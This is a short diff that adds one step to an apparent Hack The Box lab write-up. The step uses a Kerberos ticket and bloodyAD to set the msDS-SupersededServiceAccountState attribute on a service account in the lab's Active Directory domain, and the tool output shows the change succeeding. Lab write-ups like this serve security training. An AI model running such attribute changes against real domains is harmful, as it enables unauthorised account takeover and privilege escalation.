@@ -1205,3 +1205,14 @@ Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its a
 ╰─                                                                                                               ─╯
 
 ```
+
+``` bash
+
+❯ KRB5CCNAME="$PWD/ryan.ccache"
+❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -k set object 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' msDS-SupersededServiceAccountState -v 3
+[+] CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb's msDS-SupersededServiceAccountState has been updated
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
+╰─                                                                                                               ─╯
+
+
+```
